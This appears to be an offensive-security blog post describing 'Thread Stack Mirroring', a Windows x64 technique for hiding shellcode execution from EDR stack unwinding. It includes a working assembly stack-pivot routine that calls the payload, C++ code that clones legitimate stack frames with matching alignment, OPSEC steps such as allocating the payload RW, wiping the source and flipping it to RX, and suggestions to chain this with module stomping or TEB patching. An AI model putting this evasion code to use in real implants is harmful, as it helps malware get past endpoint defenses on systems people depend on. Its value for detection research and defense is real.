
---

# Evading EDR Stack Unwinders with Thread Stack Mirroring

## Beyond JMP RBX: Thread Stack Mirroring for EDR Evasion

## Introduction

If you work in offensive security or malware research, you know that the era of memory scanning has shifted. Modern EDRs don't just scan memory pages for malicious signatures; they analyze the execution flow of threads. Specifically, they perform Virtual Stack Unwinding.

For a long time, the solution was Return Address Spoofing—manipulating the stack to place a legitimate return address (like a JMP RBX gadget in kernel32.dll) at the top.

However, while I was building a spoofer, I found that traditional spoofing is fragile. It crashes on complex APIs due to register clobbering, and it is becoming increasingly easy to signature.

This post details my journey moving from basic spoofing to a recent technique: Thread Stack Mirroring, and the technical challenges of implementing it in C++ and Assembly on x64.

---

## Why "JMP RBX" Isn't Enough

In my initial spoofer, I pushed a fake return address onto the stack that pointed to a JMP RBX instruction in kernel32.dll.

It worked for `Sleep()`. It failed miserably for `MessageBoxA()`.

The reason lies in the Windows x64 Application Binary Interface (ABI).

In x64, registers like RBX, RBP, RDI, RSI, and R12-R15 are **non-volatile**. This means if a function (like MessageBoxA) uses them, it must save their state and restore them before returning.

Because my spoofer relied on RBX holding the real return address, and MessageBoxA used RBX for its own internal logic, the register was clobbered. When the API returned to my gadget, RBX no longer held the address of my shellcode. The program jumped to a random memory location and threw an `0xC0000005` Access Violation.

---

## Thread Stack Mirroring

I moved away from "faking" a single frame and towards "cloning" a valid history.

Thread Stack Mirroring involves allocating a secondary "Shadow Stack," capturing the actual legitimate stack frames of the current thread (which trace back to main and BaseThreadInitThunk), and copying them to the shadow stack.

When we pivot execution to this shadow stack, EDR analyzing the thread sees a chain of return addresses belonging to legitimate modules.

### 1. The Assembly Pivot

I wrote a custom Assembly function that performs the context switch. It must be perfectly symmetrical to prevent crashes.

```asm
ExecutePivoted PROC
    ; [1] Preserve Non-Volatile Registers
    ; We must save R12-R15, RDI, RSI, RBX, and RBP.
    ; If we don't, the host process (e.g., explorer.exe) will crash 
    ; when our shellcode returns.
    push rbp
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    
    ; [2] Save the Real Stack Pointer
    mov r11, rsp
    
    ; [3] The Pivot
    ; RDX holds the address of our "Mirrored" stack.
    ; We swap the stack pointer to point to our fake history.
    mov rsp, rdx
    
    ; [4] Link Back Home
    ; We push the REAL RSP onto the FAKE stack.
    ; This allows us to restore the stack later.
    push r11
    
    ; [5] Execute Payload
    sub rsp, 40     ; Allocate Shadow Space (Win x64 requirement)
    call rcx        ; Call the shellcode entry point
    add rsp, 40     ; Clean up shadow space
    
    ; [6] Restore State
    pop r11         ; Recover the original stack pointer
    mov rsp, r11    ; Pivot back to reality
    
    ; [7] Restore Registers
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    pop rbp
    
    ret
ExecutePivoted ENDP
```

### 2. The Alignment 

Here we leave the Assembly and move to C++. This is where I encountered the most annoying part: **Stack Alignment**.

The x64 ABI mandates that the Stack Pointer (RSP) must be **16-byte aligned** before a function call. If it isn't, SIMD instructions (like `movaps`, common in the C runtime) will crash.

If we blindly `memcpy` the legitimate stack to a new buffer, we might shift the alignment. For example, if the buffer starts at address `0x...08` but the original stack was aligned to `0x...00`, the offset destroys the alignment.

I implemented a dynamic fix that calculates the exact offset of the original stack and replicates it in the mirror:

```cpp
// First we Capture the legitimate context
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
RtlCaptureContext(&ctx);

// Then we Match the exact alignment offset of the original stack
// If ctx.Rsp ends in 0x8, our mirror must also end in 0x8 relative to the 16-byte boundary.
uintptr_t originalOffset = ctx.Rsp & 0xF;

// So we calculate the top of our allocated buffer
uintptr_t baseDest = (topOfStack - bytesToMirror - 0x20) & ~0xF;

// Then we apply the offset
void* mirrorDest = (void*)(baseDest + originalOffset);

// and we copy the legit frames
memcpy(mirrorDest, (void*)ctx.Rsp, bytesToMirror);
```

This means that when `ExecutePivoted` runs, the CPU finds the stack exactly where it wants it to be.

### 3. OPSEC:

If we allocate `PAGE_EXECUTE_READWRITE` (RWX) memory then we instantly burn the OPSEC. I've implemented several OPSEC improvements:

- **Allocate RW**: `VirtualAlloc` with `PAGE_READWRITE`
- **Copy & Clean**: Copy the shellcode, then immediately `RtlSecureZeroMemory` the source buffer to wipe the payload from the heap
- **Flip to RX**: Use `VirtualProtect` to switch the memory to `PAGE_EXECUTE_READ` immediately before the pivot

But this can still be chained ofcourse with like TEB patching, Module stomping, or Hardware Breakpoints.

EDRs utilizing **ETWTi** or periodic memory scanning (e.g., `Get-InjectedThread`) or other heuristics will flag any thread where the RIP points to unbacked executable memory, regardless of how perfect the call stack looks.

---

## Core Concepts

If you're new to stack evasion, I'd recommend looking up these concepts first:

- **The x64 ABI (Application Binary Interface)**: Windows x64 architecture dictates how functions call each other. Crucially, it defines **Non-Volatile Registers** (RBX, RBP, RDI, RSI, R12-R15). If a function uses these, it must save their value and restore them before returning.

- **Virtual Stack Unwinding**: The process of tracing a thread's history by reading return addresses off the stack. EDRs use this to determine if a call to Sleep came from a legitimate module (like explorer.exe) or a malicious implant.

- **Register Clobbering**: The failure state of basic spoofers. If you hide your return address in a register (like RBX) and call a complex API (like MessageBoxA), that API will use RBX for its own work, overwriting your return address and causing the program to crash upon return.

- **ETW-TI**: Event Tracing for Windows - Threat Intelligence, a ETW provider used by EDRs to monitor thread context changes and other suspicious activities.

---

## Demo:

### 1. Executing the Stack Pivot

After executing the mov rsp, rdx instruction, we can see the RSP register confirming the stack pointer has been hijacked. Notice the contrast: the original thread stack address is safely preserved in R11 (0x...F938), while RSP now points directly to our dynamically allocated heap mirror at 0x...FDE0.

![alt text](SCREEN-SHOT-1.png)


### 2. Verifying Payload Memory Permissions
![alt text](<screenshot-2 (2).png>)
Once we inspect the process memory. The payload is mapped at 0x1fd11d60000. By allocating as RW, writing the payload, and using VirtualProtect to flip to RX, we map the shellcode into Private commit memory while avoiding the highly scrutinized RWX memory indicator.

### 3. Execution Confirmation

![alt text](calc.gif)

Because we properly preserved the non-volatile registers (rbx, rsi, rdi, r12-r15) before the pivot and restored them after, the thread remains perfectly stable once the payload finishes executing.

The full Proof of Concept is available [on my GitHub](https://github.com/msdbg/synthetixv1).